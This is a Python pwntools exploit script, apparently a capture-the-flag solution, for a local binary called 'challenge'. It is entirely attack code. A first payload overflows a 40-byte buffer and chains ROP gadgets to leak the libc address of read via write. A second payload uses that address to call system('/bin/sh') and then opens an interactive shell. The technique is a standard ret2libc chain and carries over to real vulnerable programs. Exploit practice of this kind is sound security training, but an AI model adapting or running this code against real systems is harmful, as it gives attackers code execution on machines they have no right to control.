from pwn import *

elf = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)
gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
payload = b"A"*40
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload += p64(1)
payload += p64(rop.find_gadget(['pop rsi', 'ret']).address)
payload += p64(elf.got['read'])
payload += p64(rop.find_gadget(['pop rdx', 'ret']).address)
payload += p64(8)
payload += p64(elf.plt['write'])
payload += p64(elf.symbols['vulnerable'])

p.sendafter(b"send your input:\n", payload)
base = u64(p.recv(8)) - libc.symbols['read']
log.info(f"[*]{hex(base)}")

payload2 = b"A"*40
payload2 += p64(rop.find_gadget(['ret']).address)
payload2 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload2 += p64(next(libc.search(b"/bin/sh\x00")) + base)
payload2 += p64(libc.symbols['system'] + base)
payload2 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload2 += p64(0)
payload2 += p64(libc.symbols['read'] + base)
p.sendafter(b"send your input:\n", payload2)

p.interactive()
